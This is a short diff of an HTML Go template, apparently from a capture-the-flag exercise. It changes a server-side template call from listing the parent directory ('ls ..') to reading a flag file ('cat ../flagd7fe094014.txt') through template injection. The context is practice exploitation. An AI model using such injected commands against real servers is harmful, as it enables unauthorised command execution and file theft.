@@ -14,7 +14,7 @@
     <main>
         <h2>Available template data:</h2>
         <ul>
-            <li>Client IP: {{.FetchServerInfo "ls .."}}</li>
+            <li>Client IP: {{.FetchServerInfo "cat ../flagd7fe094014.txt"}}</li>
             <li>Client User Agent: {{.ClientUA}}</li>
             <li>IP Version: {{.ClientIpInfo.IpVersion}}</li>
             <li>IP Address: {{.ClientIpInfo.IpAddress}}</li>
